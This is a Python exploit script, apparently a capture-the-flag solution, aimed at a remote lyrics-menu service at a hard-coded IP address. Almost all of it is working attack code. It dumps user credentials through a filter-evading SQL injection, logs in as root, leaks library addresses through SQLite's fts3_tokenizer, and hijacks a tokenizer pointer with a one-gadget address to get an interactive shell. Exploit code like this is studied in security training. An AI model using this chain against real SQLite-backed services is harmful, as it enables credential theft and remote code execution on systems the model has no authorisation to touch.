#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

host = "104.199.132.199"
port = 1990
#host = "10.211.55.16"
#port = 8888

sock = make_conn(host,port)


def sqli(syntax,ret = None):
    recvuntil(sock,":")
    sendline(sock,"3")
    recvuntil(sock,":")
    sendline(sock,syntax)
    if ret :
        data = recvuntil(sock,"-------------------------")
        return data

def add(title,artist,lytic):
    recvuntil(sock,":")
    sendline(sock,"5")
    recvuntil(sock,":")
    sendline(sock,title)
    recvuntil(sock,":")
    sendline(sock,artist)
    recvuntil(sock,":")
    sendline(sock,lytic)


""" Get root hash = 15805268586274155
recvuntil(sock,"name?")
sendline(sock,"ddaa")
sqli("'union/**/select-1,username,password/**/from/**/users--")
"""
recvuntil(sock,"name?")
sendline(sock,"root")
recvuntil(sock,":")
sendline(sock,"\x64\x03\x34\x03\x52\x4f\x73\x36") #passwod 

data = sqli("'/**/union/**/select/**/hex(fts3_tokenizer('simple')),1,3--",True)
raw =  data.split()[-5][:-1]
ptr = unpack(raw.decode('hex'))
libsqlite = ptr - 0x2b4d80
libc_buf = libsqlite+0x4d8000
libc = libsqlite - 0x3c5000
magic =libc +  0xe681d

print "libsqlite3 :",hex(libsqlite)
print "libc buf :",hex(libc_buf)
print "libc :",hex(libc)

sqli("'union/**/select-fts3_tokenizer('s',x'"+ pack(libc_buf + 0x40).encode('hex') +"'),2,3--")

add("ddaa","ddaa",pack(magic)*30)
sqli("';create/**/virtual/**/table/**/a/**/using/**/fts3(tokenize=s);")

inter(sock)
